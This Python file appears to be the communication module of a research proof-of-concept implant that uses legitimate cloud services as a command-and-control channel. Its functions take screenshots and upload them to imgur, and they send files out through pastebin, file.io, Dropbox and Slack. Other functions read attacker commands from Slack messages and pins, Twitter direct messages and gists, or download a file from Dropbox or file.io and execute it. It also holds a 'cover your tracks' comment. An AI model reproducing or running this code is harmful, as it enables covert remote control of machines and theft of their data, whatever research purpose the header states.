# Copyright 2019 Netskope, Inc.
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
# following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following
# disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following
# disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote
# products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
# Written by Erick Galinkin
#
# This code is a proof of concept intended for research purposes only. It does not contain any payloads.  It is not
# weaponized.

import requests
import utils
import time
import tempfile
import shutil
import base64
import os
import tweepy
from tweepy.api import API
import json

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
             "Chrome/74.0.3729.169 Safari/537.36"


def imgur_capture_screen(creds, sleep=0, admin=False):
    """
    Captures the screen after (optionally) sleeping for some number of seconds and uploads it to imgur.
    If admin is set to true (that is, if you're admin!)
    Returns the imgur link.
    """
    time.sleep(sleep)
    if admin:
        tempdir = tempfile.mkdtemp()
        fname = utils.screenshot(tempdir, "screencap.png")
    else:
        fname = utils.screenshot("./", "screencap.png")

    link = imgur_upload_image(fname, creds)

    if admin:
        shutil.rmtree(tempdir)
    else:
        os.remove(fname)

    return link


def imgur_upload_image(image_path, creds):
    url = "https://api.imgur.com/3/image"
    headers = {
        'user-agent': user_agent,
        'authorization': 'Client-ID {}'.format(creds)
    }

    try:
        r = requests.post(
            url,
            headers=headers,
            data={
                'image': base64.b64encode(open(image_path, 'rb').read()),
                'title': image_path
            }
        )

        data = r.json()
        return data['data']['link']

    except Exception:
        return "Upload failed"


def get_keys():
    # TODO: Have a better way to get keys - maybe CLI arguments
    # Could probably hard code the urls, but this makes it so we can just not commit the urls to the repo.
    # urls.txt one URL per line.
    # urls.txt should look like:
    #     Slack <url to get slack token>
    #     Slack <url to get slack token>
    #     Twitter <url to get twitter keys>
    #     Twiter <url to get twitter keys>
    # Or however many tokens you have. 
    f = open("urls.txt")
    urls = [line.strip().split(" ") for line in f]
    f.close()
    # Cover your tracks a little bit buddy
    # os.remove("urls.txt")
    headers = {
        'user-agent': user_agent
    }
    for url in urls:
        try:
            method = url[0]
            r = requests.get(
                url[1],
                headers=headers
            )
            key = r.text.strip()
            if method == "Twitter":
                key = tuple(key.split(";"))
            return method, key
        except Exception:
            pass
    return None, None


def pastebin_paste_file_contents(devkey, filepath):
    url = "https://pastebin.com/api/api_post.php"
    headers = {
        'user-agent': user_agent
    }
    with open(filepath, "r") as f:
        contents = f.read()

    args = {
        "api_dev_key": devkey,
        "api_option": "paste",
        "api_paste_code": contents

    }
    r = requests.post(
        url,
        headers=headers,
        data=args
    )

    link = r.text
    return link


def github_get_commands(gist_location):
    headers = {
        'user-agent': user_agent
    }
    r = requests.get(
        gist_location,
        headers
    )
    command = r.text
    return command


def dropbox_download_exec(creds, filepath):
    url = "https://content.dropboxapi.com/2/files/download"
    headers = {
        "Authorization": "Bearer {}".format(creds),
        "Dropbox-API-Arg": "{\"path\":\"" + filepath + "\"}"
    }

    r = requests.post(url, headers=headers)

    with open("asdf", "wb") as f:
        f.write(r.text.encode())

    os.system("chmod 777 asdf")
    os.system("./asdf")
    os.remove("asdf")


def dropbox_upload(creds, cname, filepath):
    if not dropbox_folder_check(creds, cname):
        return None
    url = "https://content.dropboxapi.com/2/files/upload"
    fname = os.path.basename(filepath)
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/octet-stream",
        'Authorization': "Bearer {}".format(creds),
        "Dropbox-API-Arg": "{\"path\":\"/" + cname.lower() + "/" + fname.lower() + "\",\"autorename\":true}"
    }
    data = open(filepath, "rb").read()
    r = requests.post(
        url,
        headers=headers,
        data=data
    )
    return r.status_code == 200


def dropbox_folder_check(creds, folder_name):
    url = "https://api.dropboxapi.com/2/files/list_folder"
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/json",
        'Authorization': "Bearer {}".format(creds),
    }
    content = {
        "path": "/{}".format(folder_name.lower())
    }
    r = requests.post(
        url,
        headers=headers,
        data=json.dumps(content)
    )
    if r.status_code != 200:
        url = "https://api.dropboxapi.com/2/files/create_folder_v2"
        r = requests.post(
            url,
            headers=headers,
            data=json.dumps(content)
        )
        if r.status_code != 200:
            return False
    return True


def slack_checkin(creds, sysinfo):
    url = "https://slack.com/api/conversations.list?token={}".format(creds)
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/json"
    }
    r = requests.get(
        url,
        headers=headers
    )

    data = r.json()
    for channel in data['channels']:
        if channel['name'] == 'general':
            channel_id = channel['id']
            resp = slack_post_to_channel(channel_id, creds, sysinfo)
            if resp is not None:
                pin = slack_get_pins(channel_id, creds)
                return pin
    return None


def slack_upload_file(channel, creds, file):
    url = "https://slack.com/api/files.upload"
    headers = {
        'user-agent': user_agent,
        'Authorization': "Bearer {}".format(creds)
    }
    content = {
        'file': (file, open(file, 'rb')),
        'initial_comment': file,
        'channels': channel,
    }

    r = requests.post(
        url,
        headers=headers,
        files=content
    )

    data = r.json()
    link = data['file']['url_private_download']

    return link


def slack_create_channel(channel_name, creds):
    url = "https://slack.com/api/channels.create?token={}&name={}".format(creds, channel_name)
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/json",
    }
    r = requests.post(
        url,
        headers=headers
    )
    data = r.json()
    if data["ok"]:
        return data["channel"]["id"]


def slack_get_commands(channel, creds):
    # We could proably listen and use the Events API but that sounds a lot like hosting an HTTP server on localhost
    url = "https://slack.com/api/conversations.history?token={}&channel={}&limit=1".format(creds, channel)
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/x-www-form-urlencoded"
    }
    r = requests.get(
        url,
        headers=headers
    )

    data = r.json()
    if data["ok"]:
        if "subtype" in data['messages'][-1].keys():
            if data['messages'][-1]['subtype'] == "bot_message":
                return None
        cmd = data["messages"][-1]["text"]
        cmd = cmd.split("\n")
        return cmd
    else:
        return None


def slack_get_pins(channel, creds):
    url = "https://slack.com/api/pins.list?token={}&channel={}".format(creds, channel)
    headers = {
        'user-agent': user_agent
    }
    r = requests.get(
        url,
        headers=headers
    )

    data = r.json()
    if data['ok']:
        pin_cmd = data['items'][0]['message']['text']
        pin_cmd = pin_cmd.split("\n")
        return pin_cmd


def slack_post_to_channel(channel, creds, message):
    url = "https://slack.com/api/chat.postMessage"
    headers = {
        'user-agent': user_agent,
        'Content-type': "application/json",
        'Authorization': "Bearer {}".format(creds)
    }
    content = {
        "channel": channel,
        "text": message
    }
    r = requests.post(
        url,
        headers=headers,
        json=content
    )
    data = r.json()
    if data["ok"]:
        return channel
    else:
        return None


# TODO: handle the API objects better so we don't get rate limited all the time
def twitter_checkin(creds, sysinfo):
    consumer_key, consumer_secret, access_token, access_token_secret = creds
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)

    api = API(auth, wait_on_rate_limit=True)
    api.update_status(sysinfo)
    return ["twitter_checkin"]


def twitter_get_commands(creds):
    consumer_key, consumer_secret, access_token, access_token_secret = creds
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)

    api = API(auth, wait_on_rate_limit=True)
    dms = api.list_direct_messages(3)
    for dm in dms:
        if "source_app_id" not in dm.message_create.keys():
            command = dm.message_create['message_data']['text']
            return command
    return None


def twitter_post_response(creds, message, user):
    consumer_key, consumer_secret, access_token, access_token_secret = creds
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)

    api = API(auth, wait_on_rate_limit=True)
    api.send_direct_message(user, message)
    return True


def fileio_upload(filepath):

    files = {
        'file': (filepath, open(filepath, 'rb')),
    }
    headers = {
        'user-agent': user_agent
    }

    r = requests.post(
        'https://file.io/',
        files=files,
        headers=headers
    )

    data = r.json()

    return data['link']


def fileio_download_exec(filekey):
    url = "https://file.io/{}".format(filekey)
    headers = {
        'user-agent': user_agent
    }

    r = requests.get(
        url,
        headers=headers
    )

    with open("asdf", "wb") as f:
        f.write(r.text.encode())

    os.system("chmod 777 asdf")
    os.system("./asdf")
    os.remove("asdf")
